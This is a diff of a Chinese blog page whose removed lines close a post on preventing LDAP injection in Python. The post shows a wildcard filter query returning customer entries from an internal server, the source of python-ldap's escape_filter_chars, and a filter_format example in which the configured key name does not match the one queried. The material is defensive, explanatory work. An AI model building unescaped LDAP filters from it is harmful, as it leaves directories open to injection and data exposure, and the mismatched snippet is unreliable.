-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">In [70]: import ldap</div><div class="line">In [71]: l = ldap.initialize(&apos;ldap://10.5.0.220:389&apos;)</div><div class="line">In [76]: l.bind(&apos;LDAP_ROOTDN&apos;,&apos;LDAP_ROOTPW&apos;)</div><div class="line">Out[76]: 4</div><div class="line">In [77]: l.search_s(&apos;LDAP_ROOTDN&apos;,ldap.SCOPE_SUBTREE,&apos;(cn=645*)&apos;)</div><div class="line">Out[77]:</div><div class="line">[(&apos;cn=64502d93-a8ab-3ba1-991a-74cfde8cb333,cn=admin,o=3333049f-92d2-3c3a-91c2-6e1ef4c6a6bf,o=customer&apos;,.......</div></pre></td></tr></table></figure>
-<p>而且ldap的查询接口不像sql结果，有参数化查询，ldap的接口只能从参数过滤上做功夫来防止注入,但是好歹ldap提供了一个安全过滤接口ldap.filter.在这个接口中有escape_filter_chars函数，源码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape_filter_chars</span><span class="params">(assertion_value,escape_mode=<span class="number">0</span>)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line">  Replace all special characters found in assertion_value</div><div class="line">  by quoted notation.</div><div class="line"></div><div class="line">  escape_mode</div><div class="line">      If 0 only special chars mentioned in RFC 4515 are escaped.</div><div class="line">      If 1 all NON-ASCII chars are escaped.</div><div class="line">      If 2 all chars are escaped.</div><div class="line">  """</div><div class="line">  <span class="keyword">if</span> escape_mode:</div><div class="line">    r = []</div><div class="line">    <span class="keyword">if</span> escape_mode==<span class="number">1</span>:</div><div class="line">      <span class="keyword">for</span> c <span class="keyword">in</span> assertion_value:</div><div class="line">        <span class="keyword">if</span> c &lt; <span class="string">'0'</span> <span class="keyword">or</span> c &gt; <span class="string">'z'</span> <span class="keyword">or</span> c <span class="keyword">in</span> <span class="string">"\\*()"</span>:</div><div class="line">          c = <span class="string">"\\%02x"</span> % ord(c)</div><div class="line">        r.append(c)</div><div class="line">    <span class="keyword">elif</span> escape_mode==<span class="number">2</span>:</div><div class="line">      <span class="keyword">for</span> c <span class="keyword">in</span> assertion_value:</div><div class="line">        r.append(<span class="string">"\\%02x"</span> % ord(c))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">raise</span> ValueError(<span class="string">'escape_mode must be 0, 1 or 2.'</span>)</div><div class="line">    s = <span class="string">''</span>.join(r)</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    s = assertion_value.replace(<span class="string">'\\'</span>, <span class="string">r'\5c'</span>)</div><div class="line">    s = s.replace(<span class="string">r'*'</span>, <span class="string">r'\2a'</span>)</div><div class="line">    s = s.replace(<span class="string">r'('</span>, <span class="string">r'\28'</span>)</div><div class="line">    s = s.replace(<span class="string">r')'</span>, <span class="string">r'\29'</span>)</div><div class="line">    s = s.replace(<span class="string">'\x00'</span>, <span class="string">r'\00'</span>)</div><div class="line">  <span class="keyword">return</span> s</div></pre></td></tr></table></figure>
-<p>源码解读如下：如果未设置转义模式，就将\,*,(,),\x00这5个字符转成其ascii码值。那么如何过滤呢？代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=ldap.filter.escape_filter_chars(name)</div></pre></td></tr></table></figure>
-<p>经过过滤之后再丢到查询参数中。<br>或者使用filter_format,注意占位符%s和参数的对应关系。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">current_app.setdefault(<span class="string">'LDAP_GROUP_OBJECT_FILTER'</span>,                         <span class="string">'(&amp;(objectclass=Group)(userPrincipalName=%s))'</span>)</div><div class="line">query = ldap.filter.filter_format(</div><div class="line">                current_app[<span class="string">'LDAP_USER_OBJECT_FILTER'</span>], (user,))</div></pre></td></tr></table></figure>
-<p>总之记住一条，ldap的搜索参数是需要手工过滤的。</p>
-<p>参考链接：</p>
-<p><a href="http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html" target="_blank" rel="external">http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2188,7 +2179,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-count">26</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2209,8 +2200,8 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">101</span>
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">103</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
